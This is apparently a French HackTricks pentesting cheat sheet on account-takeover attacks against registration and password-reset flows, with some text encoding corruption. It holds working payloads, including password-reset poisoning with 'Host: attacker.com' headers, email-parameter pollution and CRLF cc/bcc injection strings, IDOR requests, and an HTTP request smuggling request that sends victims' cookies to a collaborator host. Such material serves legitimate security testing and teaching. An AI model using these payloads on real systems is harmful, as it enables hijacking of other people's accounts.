# Vuln√©rabilit√©s d'Inscription & de Prise de Contr√¥le

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √âquipe Rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Prise de Contr√¥le de l'Inscription

### Inscription en Double

* Essayez de g√©n√©rer en utilisant un nom d'utilisateur existant
* V√©rifiez en variant l'e-mail :
  * majuscules
  * \+1@
  * ajoutez des points dans l'e-mail
  * caract√®res sp√©ciaux dans le nom de l'e-mail (%00, %09, %20)
  * Mettez des caract√®res noirs apr√®s l'e-mail : `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### √ânum√©ration des Noms d'Utilisateur

V√©rifiez si vous pouvez d√©terminer si un nom d'utilisateur a d√©j√† √©t√© enregistr√© dans l'application.

### Politique de Mot de Passe

En cr√©ant un utilisateur, v√©rifiez la politique de mot de passe (v√©rifiez si vous pouvez utiliser des mots de passe faibles).\
Dans ce cas, vous pouvez essayer de forcer les informations d'identification.

### Injection SQL

[**Consultez cette page** ](sql-injection/#insert-statement)pour apprendre comment tenter des prises de contr√¥le de compte ou extraire des informations via des **Injections SQL** dans les formulaires d'inscription.

### Prises de Contr√¥le Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vuln√©rabilit√©s SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Changement d'Email

Une fois inscrit, essayez de changer l'e-mail et v√©rifiez si ce changement est correctement valid√© ou s'il peut √™tre chang√© en e-mails arbitraires.

### Autres V√©rifications

* V√©rifiez si vous pouvez utiliser des **e-mails jetables**
* Un **mot de passe long** (>200) entra√Æne un **DoS**
* **V√©rifiez les limites de taux sur la cr√©ation de compte**
* Utilisez username@**burp\_collab**.net et analysez le **callback**

## **Prise de Contr√¥le de R√©initialisation de Mot de Passe**

### Fuite de Jeton de R√©initialisation de Mot de Passe Via R√©f√©rent <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Demandez la r√©initialisation du mot de passe √† votre adresse e-mail
2. Cliquez sur le lien de r√©initialisation du mot de passe
3. Ne changez pas le mot de passe
4. Cliquez sur n'importe quel site tiers (par exemple : Facebook, Twitter)
5. Interceptez la requ√™te dans le proxy Burp Suite
6. V√©rifiez si l'en-t√™te referer divulgue le jeton de r√©initialisation du mot de passe.

### Empoisonnement de R√©initialisation de Mot de Passe <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptez la demande de r√©initialisation de mot de passe dans Burp Suite
2. Ajoutez ou modifiez les en-t√™tes suivants dans Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Transf√©rez la demande avec l'en-t√™te modifi√©\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Recherchez une URL de r√©initialisation de mot de passe bas√©e sur l'en-t√™te _host_ comme : `https://attacker.com/reset-password.php?token=TOKEN`

### R√©initialisation de Mot de Passe Via Param√®tre Email <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les param√®tres de l'API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et acc√©der √† la fonctionnalit√© **Changer de mot de passe**.
2. D√©marrer Burp Suite et intercepter la requ√™te.
3. Envoyez-la √† l'onglet repeater et modifiez les param√®tres : ID utilisateur/email\
`powershell POST /api/changepass [...] ("form": {"email":"victime@email.com","password":"motdepassesecurise"})`

### Jeton de r√©initialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le jeton de r√©initialisation de mot de passe doit √™tre g√©n√©r√© de mani√®re al√©atoire et unique √† chaque fois.\
Essayez de d√©terminer si le jeton expire ou s'il est toujours le m√™me, dans certains cas, l'algorithme de g√©n√©ration est faible et peut √™tre devin√©. Les variables suivantes pourraient √™tre utilis√©es par l'algorithme.

* Horodatage
* ID utilisateur
* Email de l'utilisateur
* Pr√©nom et nom de famille
* Date de naissance
* Cryptographie
* Chiffres uniquement
* Petite s√©quence de jeton (caract√®res entre \[A-Z,a-z,0-9])
* R√©utilisation du jeton
* Date d'expiration du jeton

### Fuite de jeton de r√©initialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. D√©clenchez une demande de r√©initialisation de mot de passe en utilisant l'API/UI pour un e-mail sp√©cifique par exemple : test@mail.com
2. Inspectez la r√©ponse du serveur et recherchez `resetToken`
3. Ensuite, utilisez le jeton dans une URL comme `https://exemple.com/v3/user/password/reset?resetToken=[LE_JETON_DE_REINITIALISATION]&email=[L_EMAIL]`

### R√©initialisation de mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le syst√®me avec un nom d'utilisateur identique √† celui de la victime, mais avec des espaces blancs ins√©r√©s avant et/ou apr√®s le nom d'utilisateur. par exemple : `"admin "`
2. Demandez une r√©initialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le jeton envoy√© √† votre e-mail et r√©initialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd √©tait vuln√©rable √† cette attaque.\
Voir : [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contr√¥le de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez une XSS √† l'int√©rieur de l'application ou d'un sous-domaine si les cookies sont d√©finis sur le domaine parent : `*.domaine.com`
2. Fuite du **cookie de session** actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contr√¥le de compte via Smuggling de requ√™te HTTP <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utilisez **smuggler** pour d√©tecter le type de Smuggling de requ√™te HTTP (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Cr√©ez une requ√™te qui √©crasera le `POST / HTTP/1.1` avec les donn√©es suivantes :\
`GET http://quelquechose.burpcollaborator.net HTTP/1.1 X:` dans le but de rediriger les victimes vers burpcollab et de voler leurs cookies\
3. La requ√™te finale pourrait ressembler √† ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Prise de contr√¥le de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Cr√©er une charge utile pour le CSRF, par exemple : "Formulaire HTML avec soumission automatique pour un changement de mot de passe"
2. Envoyer la charge utile

### Prise de contr√¥le de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Le jeton JSON Web peut √™tre utilis√© pour authentifier un utilisateur.

* Modifier le JWT avec un autre ID utilisateur / e-mail
* V√©rifier la signature JWT faible

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
